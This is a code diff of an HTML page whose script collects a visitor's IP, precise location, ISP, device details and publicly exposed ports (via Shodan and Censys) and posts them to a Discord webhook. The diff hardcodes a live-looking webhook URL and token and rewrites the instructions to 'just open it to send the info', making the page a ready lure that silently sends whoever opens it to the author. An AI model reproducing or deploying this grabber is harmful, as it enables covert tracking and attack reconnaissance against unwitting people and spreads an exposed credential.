@@ -55,25 +55,21 @@
   <div class="container">
     <h1>Max Info Collector + Ports</h1>
     <div class="warning">
-      ⚠️ Collects IP, full location, device info, and publicly open ports → sends to your webhook.<br>
-      <strong>Only open locally!</strong>
+      ⚠️ This page collects IP, location, device info & publicly open ports and sends them to your Discord webhook.<br>
+      <strong>Only open this file locally on your machine!</strong>
     </div>
     <div id="status" class="status">Collecting & sending info...</div>
     <div id="ports" class="ports-list" style="display:none;"></div>
 
     <div class="instructions">
-      <p><strong>Setup:</strong></p>
-      <ol style="text-align:left; max-width:550px; margin:0 auto;">
-        <li>Replace <code>YOUR_WEBHOOK_URL_HERE</code> with your Discord webhook URL</li>
-        <li>Save & open this file locally (double-click)</li>
-        <li>All info (including ports) will be sent silently</li>
-      </ol>
-      <p style="margin-top:15px;">Note: Most home connections show 0 public ports due to NAT/router.</p>
+      <p>Everything is already set up.</p>
+      <p><strong>Just save this file and open it locally (double-click) to send the info.</strong></p>
+      <p style="margin-top:15px;">Note: Home connections usually show 0 public ports due to NAT/router.</p>
     </div>
   </div>
 
   <script>
-    // === CHANGE THIS TO YOUR OWN WEBHOOK URL ===
+    // Your webhook URL is already set here
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455052799493800151/u3ru2dK_58PLrguELCjX6h3H4Swf0xGbNxfJmgXoAaA9nqCPA0V0EJWrQobcA2SDa5nA';
 
     async function collectAndSend() {
@@ -114,8 +110,8 @@
 
         // 4. Publicly open ports (Shodan InternetDB first, then Censys fallback)
         let openPorts = [];
-        let portSource = 'None';
         let portDetails = [];
+        let portSource = 'None';
 
         try {
           const shodanRes = await fetch(`https://internetdb.shodan.io/${ip}`);
@@ -123,11 +119,12 @@
           if (shodanData.ports && shodanData.ports.length > 0) {
             openPorts = shodanData.ports;
             portSource = 'Shodan InternetDB';
-            portDetails = shodanData.ports.map(p => `${p} (TCP)`); // Shodan only lists ports
+            portDetails = shodanData.ports.map(p => `${p}/TCP`);
           }
-        } catch {}
+        } catch (e) {
+          console.warn('Shodan failed:', e);
+        }
 
-        // Fallback to Censys if Shodan has no ports
         if (openPorts.length === 0) {
           try {
             const censysRes = await fetch(`https://search.censys.io/api/v2/hosts/${ip}`, {
@@ -136,11 +133,15 @@
             if (censysRes.ok) {
               const censysData = await censysRes.json();
               const services = censysData.result?.services || [];
-              openPorts = services.map(s => s.port);
-              portDetails = services.map(s => `${s.port}/${(s.service_name || 'TCP').toUpperCase()}`);
-              portSource = 'Censys';
+              if (services.length > 0) {
+                openPorts = services.map(s => s.port);
+                portDetails = services.map(s => `${s.port}/${(s.service_name || 'TCP').toUpperCase()}`);
+                portSource = 'Censys';
+              }
             }
-          } catch {}
+          } catch (e) {
+            console.warn('Censys failed:', e);
+          }
         }
 
         // Display ports on page
@@ -163,7 +164,7 @@
               { name: 'Postal / ZIP', value: geo.postal || '—', inline: true },
               { name: 'Timezone', value: geo.timezone || device.timezone, inline: true },
               { name: 'ISP / Org', value: geo.org || '—', inline: true },
-              { name: 'Hostname', value: geo.hostname || '—', inline: true },
+              { name: 'Hostname', value: geo.hostname || 'Not available', inline: true },
               { name: 'Browser', value: device.browser, inline: true },
               { name: 'Platform', value: device.platform, inline: true },
               { name: 'Screen', value: device.screen, inline: true },
